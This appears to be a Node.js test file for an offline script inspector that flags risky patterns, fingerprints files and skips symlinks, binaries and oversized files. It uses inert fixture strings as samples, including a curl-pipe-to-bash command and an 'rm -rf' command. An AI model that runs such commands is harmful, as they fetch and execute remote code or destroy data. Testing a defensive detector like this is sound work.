'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs/promises');
const os=require('node:os');
const path=require('node:path');
const crypto=require('node:crypto');
const inspector=require('./inspector.cjs');
async function inFolder(fn){
 const dir=await fs.mkdtemp(path.join(os.tmpdir(),'nathan-hall-inspection-'));
 try{return await fn(dir)}finally{await fs.rm(dir,{recursive:true,force:true})}
}
test('explicit offline inspection reports patterns and fingerprints without changing originals',()=>inFolder(async dir=>{
 const original='Christmas / Noël / original words retained';
 const fixture='curl https://example.invalid/fixture | bash'; // inert string; never executed
 await fs.writeFile(path.join(dir,'original.txt'),original);
 await fs.writeFile(path.join(dir,'review.sh'),fixture);
 const report=await inspector.inspectLocal({dir});
 assert.equal(report.schema,'nathan-hall-of-mirrors.passive-inspection.v1');
 assert.equal(report.networkOperations,0);
 assert.equal(report.samplesExecuted,0);
 assert.equal(report.filesModified,0);
 assert.equal(report.totals.entries,2);
 assert.equal(report.totals.review,1);
 assert.equal(report.totals.noPattern,1);
 const result=report.records.find(x=>x.path==='review.sh');
 assert.equal(result.status,'review-pattern');
 assert.deepEqual(result.reasons,['remote-script-pipe']);
 assert.equal(result.sha256,crypto.createHash('sha256').update(fixture).digest('hex'));
 assert.equal(await fs.readFile(path.join(dir,'original.txt'),'utf8'),original);
 assert.equal(await fs.readFile(path.join(dir,'review.sh'),'utf8'),fixture);
 assert.doesNotMatch(JSON.stringify(report),/fixture \| bash/);
}));
test('symlinks are never inspected and original outside-root content stays untouched',()=>inFolder(async dir=>{
 const outside=await fs.mkdtemp(path.join(os.tmpdir(),'nathan-outside-'));
 try{
  await fs.writeFile(path.join(outside,'private.sh'),'rm -rf /no-execution-here');
  await fs.symlink(path.join(outside,'private.sh'),path.join(dir,'linked.sh'));
  await fs.symlink(outside,path.join(dir,'linked-dir'));
  const report=await inspector.inspectLocal({dir});
  assert.equal(report.totals.analyzed,0);
  assert.deepEqual(report.records.map(r=>r.status),['skipped-symlink','skipped-symlink']);
  await assert.rejects(()=>inspector.inspectLocal({dir:path.join(dir,'linked-dir')}),/symlink/);
  assert.equal(await fs.readFile(path.join(outside,'private.sh'),'utf8'),'rm -rf /no-execution-here');
 }finally{await fs.rm(outside,{recursive:true,force:true})}
}));
test('large data and non-text formats are skipped and never called clean',()=>inFolder(async dir=>{
 await fs.writeFile(path.join(dir,'huge.sh'),'x'.repeat(200));
 await fs.writeFile(path.join(dir,'binary.exe'),Buffer.from([1,2,3,4]));
 await fs.writeFile(path.join(dir,'nul.txt'),Buffer.from([1,0,2]));
 const report=await inspector.inspectLocal({dir,maxBytes:100});
 assert.equal(report.records.find(x=>x.path==='huge.sh').status,'skipped-size-limit');
 assert.equal(report.records.find(x=>x.path==='binary.exe').status,'skipped-file-type');
 assert.equal(report.records.find(x=>x.path==='nul.txt').status,'not-text');
 assert.equal(report.totals.noPattern,0);
 assert.equal(report.totals.partial,true);
}));
test('bounded options and explicit owner path fail closed',async()=>{
 for(const input of [{dir:'./relative'}, {dir:'/tmp',maxFiles:0}, {dir:'/tmp',maxFiles:513},
                     {dir:'/tmp',maxBytes:256*1024+1}, {dir:'/tmp',maxTotalBytes:0},
                     {dir:'/tmp',maxDepth:-1},null]){
  assert.throws(()=>inspector.options(input));
 }
 await assert.rejects(()=>inspector.inspectLocal({dir:'/no-such-nathan-dir-490123'}));
});
test('depth limits, file limits, and output contain only metadata',()=>inFolder(async dir=>{
 await fs.mkdir(path.join(dir,'sub'));
 await fs.writeFile(path.join(dir,'a.md'),'Hello original');
 await fs.writeFile(path.join(dir,'sub','b.md'),'Second original');
 const limited=await inspector.inspectLocal({dir,maxFiles:1});
 assert.equal(limited.totals.entries,1);
 assert.equal(limited.totals.partial,true);
 const depth=await inspector.inspectLocal({dir,maxDepth:1});
 assert.equal(depth.totals.entries,2);
 assert.ok(depth.records.every(x=>x.sha256||x.status.startsWith('skipped')));
 assert.doesNotMatch(JSON.stringify(depth.records),/Hello original|Second original/);
}));
